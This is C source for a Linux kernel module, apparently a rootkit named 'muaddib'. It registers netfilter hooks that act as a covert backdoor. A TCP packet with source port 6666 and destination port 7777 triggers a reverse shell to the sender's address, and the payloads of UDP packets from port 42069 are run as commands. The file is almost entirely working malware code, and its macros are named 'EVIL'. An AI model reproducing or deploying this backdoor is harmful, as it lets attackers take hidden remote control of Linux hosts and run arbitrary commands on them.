#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>

#define EVIL_DEST_PORT 7777
#define EVIL_SRC_PORT 6666
#define MAX_CMD_LEN 255

#define UDP_EVIL_SRC_PORT 42069

static struct nf_hook_ops nf_ops;
static struct nf_hook_ops udp_hook_ops;

static unsigned int nf_hook_muadDib(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	struct iphdr *iph;
	struct tcphdr *tcph;
	if(!skb){
		return NF_ACCEPT;
	}
	
	iph = ip_hdr(skb);
	if(!iph){ return NF_ACCEPT; }
	tcph = tcp_hdr(skb);
	if(!tcph){ return NF_ACCEPT; }
	
	char ipstring[18];
	
	unsigned short *dptr;
	unsigned short dport;
	dptr = (unsigned short *)((char *)iph + 22); 
	dport = ntohs(*dptr);
	
	unsigned short srcport;
	srcport = ntohs(tcph->source);
	
	if(dport == EVIL_DEST_PORT && srcport == EVIL_SRC_PORT){
		#if DEBUGMSG == 1
		printk(KERN_INFO "muaddib: evil is about to happen");
		printk(KERN_INFO "muaddib: source port: %d", srcport);
		printk(KERN_INFO "muaddib: dest port: %d", dport);
		#endif
		unsigned char *bytes = (unsigned char *) &iph->saddr;
		snprintf(ipstring, sizeof(ipstring), "%d.%d.%d.%d", bytes[0], bytes[1], bytes[2], bytes[3]);
		start_reverse_shell(ipstring, REVERSE_SHELL_PORT);
	}
	

	return NF_ACCEPT;	
	
}

static unsigned int udp_command_parse_hook(void *priv,struct sk_buff *skb, const struct nf_hook_state *state){
    struct iphdr *iph;
    struct udphdr *udph;
    char *udp_data;
    unsigned int udp_data_len;
    char *cmd_buffer;
    iph = ip_hdr(skb);
    if (!iph)
        return NF_ACCEPT;

    if (iph->protocol != IPPROTO_UDP)
        return NF_ACCEPT;

    udph = udp_hdr(skb);
    if (!udph)
        return NF_ACCEPT;

    if (ntohs(udph->source) != UDP_EVIL_SRC_PORT)
        return NF_ACCEPT;

    udp_data_len = ntohs(udph->len) - sizeof(struct udphdr);
    if (udp_data_len <= 0 || udp_data_len > MAX_CMD_LEN)
        return NF_ACCEPT;

    udp_data = (char *)((unsigned char *)udph + sizeof(struct udphdr));

    cmd_buffer = kmalloc(udp_data_len + 1, GFP_KERNEL);
    if (!cmd_buffer)
        return NF_ACCEPT;

    strncpy(cmd_buffer, udp_data, udp_data_len);
    cmd_buffer[udp_data_len] = '\0'; 

    start_command_execute(cmd_buffer);

    kfree(cmd_buffer);
    return NF_ACCEPT;
}

int reg_nf_hook(void){
    int err;
    nf_ops.hook = nf_hook_muadDib;
    nf_ops.pf = PF_INET;
    nf_ops.hooknum = NF_INET_PRE_ROUTING;
    nf_ops.priority = NF_IP_PRI_FIRST;
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        err = nf_register_net_hook(&init_net, &nf_ops);
    #else
        err = nf_register_hook(&nf_ops);
    #endif
    if(err<0){
		#if DEBUGMSG == 1
		printk(KERN_INFO "muaddib: Error registering nf hook");
		#endif
    }else{
		#if DEBUGMSG == 1
        printk(KERN_INFO "muaddib: Registered nethook");
		#endif
    }

    udp_hook_ops.hook = udp_command_parse_hook;
    udp_hook_ops.pf = PF_INET;
    udp_hook_ops.hooknum = NF_INET_PRE_ROUTING;
    udp_hook_ops.priority = NF_IP_PRI_FIRST; 
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        err = nf_register_net_hook(&init_net, &udp_hook_ops);
    #else
        err = nf_register_hook(&udp_hook_ops);
    #endif
    if(err<0){
		#if DEBUGMSG == 1
		printk(KERN_INFO "muaddib: Error registering nf hook");
		#endif
    }else{
		#if DEBUGMSG == 1
        printk(KERN_INFO "muaddib: Registered nethook");
		#endif
    }

    
    return err;
}

void unreg_nf_hook(void){
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
    nf_unregister_net_hook(&init_net, &nf_ops);
    nf_unregister_net_hook(&init_net, &udp_hook_ops);
    #else
    nf_unregister_hook(&nf_ops);
    nf_unregister_hook(&udp_hook_ops);
    #endif
    #if DEBUGMSG == 1
    printk(KERN_INFO "muaddib: Unregistered nethook");
    #endif

}
